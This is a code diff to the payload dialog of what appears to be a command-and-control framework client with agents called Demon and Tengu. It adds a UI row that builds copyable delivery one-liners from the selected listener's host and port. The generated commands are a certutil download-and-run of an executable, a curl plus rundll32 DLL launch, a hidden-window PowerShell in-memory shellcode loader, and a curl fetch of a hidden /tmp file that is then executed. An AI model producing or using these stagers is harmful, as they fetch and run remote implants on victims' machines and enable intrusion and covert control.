@@ -108,6 +108,39 @@ void Payload::setupUi( QDialog* Dialog )
 
     gridLayout->addWidget( ConsoleText, 0, 0, 1, 1 );
 
+    // ── One-liner row ─────────────────────────────────────────────────────
+    auto* onelineRow    = new QWidget( PayloadDialog );
+    auto* onelineLayout = new QHBoxLayout( onelineRow );
+    onelineLayout->setContentsMargins( 0, 2, 0, 2 );
+    onelineLayout->setSpacing( 4 );
+
+    auto* onelineLabel = new QLabel( "One-liner:", onelineRow );
+    onelineLabel->setStyleSheet( "color:#aaaaaa; font-size:11px;" );
+
+    OnelineEdit = new QLineEdit( onelineRow );
+    OnelineEdit->setReadOnly( true );
+    OnelineEdit->setStyleSheet(
+        "QLineEdit { background:#0d0d18; color:#f0f0ee; border:1px solid #2a2a3f;"
+        " border-radius:3px; padding:0 6px; font-family:monospace; font-size:11px; }" );
+    OnelineEdit->setPlaceholderText( "select a listener and format" );
+
+    CopyButton = new QPushButton( "Copy", onelineRow );
+    CopyButton->setFixedWidth( 52 );
+    CopyButton->setStyleSheet(
+        "QPushButton { background:#1a1a27; color:#f0f0ee; border:1px solid #2a2a3f;"
+        " border-radius:3px; font-size:11px; padding:2px 8px; }"
+        "QPushButton:hover { border-color:#ff6b9d; color:#ff6b9d; }"
+        "QPushButton:pressed { background:#ff6b9d22; }" );
+    connect( CopyButton, &QPushButton::clicked, this, [this]() {
+        if ( !OnelineEdit->text().isEmpty() )
+            QApplication::clipboard()->setText( OnelineEdit->text() );
+    } );
+
+    onelineLayout->addWidget( onelineLabel );
+    onelineLayout->addWidget( OnelineEdit );
+    onelineLayout->addWidget( CopyButton );
+
+    gridLayout_3->addWidget( onelineRow,      2, 0, 1, 8 );
     gridLayout_3->addWidget( BuildConsoleBox, 3, 0, 1, 8 );
 
     gridLayout_3->addItem( horizontalSpacer_7, 4, 5, 1, 1 );
@@ -121,14 +154,17 @@ void Payload::setupUi( QDialog* Dialog )
 
     connect( ButtonGenerate, &QPushButton::clicked, this, &Payload::buttonGenerate );
     connect( ComboAgentType, &QComboBox::currentTextChanged, this, &Payload::CtxAgentPayloadChange );
-    connect( ComboFormat, &QComboBox::currentTextChanged, this, [&]( const QString& text ){
-
+    connect( ComboFormat, &QComboBox::currentTextChanged, this, [this]( const QString& text ){
         if ( ComboAgentType->currentText().compare( "Demon" ) == 0 )
             DefaultConfig();
         else if ( ComboAgentType->currentText().compare( "Tengu" ) == 0 )
             TenguDefaultConfig();
-
+        updateOneliner();
     } );
+
+    connect( ComboAgentType,  &QComboBox::currentTextChanged, this, [this]( const QString& ) { updateOneliner(); } );
+    connect( ComboListener,   &QComboBox::currentTextChanged, this, [this]( const QString& ) { updateOneliner(); } );
+    connect( ComboArch,       &QComboBox::currentTextChanged, this, [this]( const QString& ) { updateOneliner(); } );
 
     QMetaObject::connectSlotsByName( PayloadDialog );
 }
@@ -829,6 +865,58 @@ auto Payload::Start() -> void
     TreeConfig->clear();
 
     retranslateUi();
+    updateOneliner();
 
     PayloadDialog->exec();
+}
+
+auto Payload::buildOneliner() -> QString
+{
+    if ( !OnelineEdit ) return {};
+
+    // resolve listener base URL
+    QString base;
+    auto listenerName = ComboListener->currentText().toStdString();
+    for ( auto& l : MugenX::Teamserver.Listeners ) {
+        if ( l.Name != listenerName ) continue;
+        if ( l.Protocol == MugenSpace::Listener::PayloadHTTP.toStdString() ||
+             l.Protocol == MugenSpace::Listener::PayloadHTTPS.toStdString() ) {
+            try {
+                auto http   = any_cast<MugenSpace::Listener::HTTP>( l.Info );
+                auto host   = http.HostBind;
+                auto port   = ( http.PortConn.isEmpty() || http.PortConn == "0" ) ? http.PortBind : http.PortConn;
+                QString scheme = ( l.Protocol == MugenSpace::Listener::PayloadHTTPS.toStdString() ) ? "https" : "http";
+                base = scheme + "://" + host + ":" + port;
+            } catch ( ... ) {}
+        }
+        break;
+    }
+
+    if ( base.isEmpty() ) return {};
+
+    auto agent  = ComboAgentType->currentText();
+    auto format = ComboFormat->currentText();
+
+    if ( agent == "Demon" ) {
+        if ( format == "Windows Exe" )
+            return QString( "certutil.exe -urlcache -f %1/demon.exe %%TEMP%%\\demon.exe && %%TEMP%%\\demon.exe" ).arg( base );
+        if ( format == "Windows Dll" )
+            return QString( "curl -s %1/demon.dll -o %%TEMP%%\\demon.dll && rundll32 %%TEMP%%\\demon.dll,DllMain" ).arg( base );
+        if ( format == "Windows Shellcode" )
+            return QString( "powershell -nop -w hidden -c \"$b=[System.Net.WebClient]::new().DownloadData('%1/demon.bin');$m=[System.Runtime.InteropServices.Marshal];$p=$m::AllocHGlobal($b.Length);$m::Copy($b,0,$p,$b.Length);$f=$m::GetDelegateForFunctionPointer($p,[Action]);$f.Invoke()\"" ).arg( base );
+    }
+
+    if ( agent == "Tengu" )
+        return QString( "curl -sL %1/tengu -o /tmp/.t && chmod +x /tmp/.t && /tmp/.t" ).arg( base );
+
+    return {};
+}
+
+auto Payload::updateOneliner() -> void
+{
+    if ( !OnelineEdit ) return;
+    auto line = buildOneliner();
+    OnelineEdit->setText( line );
+    OnelineEdit->setCursorPosition( 0 );
+    CopyButton->setEnabled( !line.isEmpty() );
 }
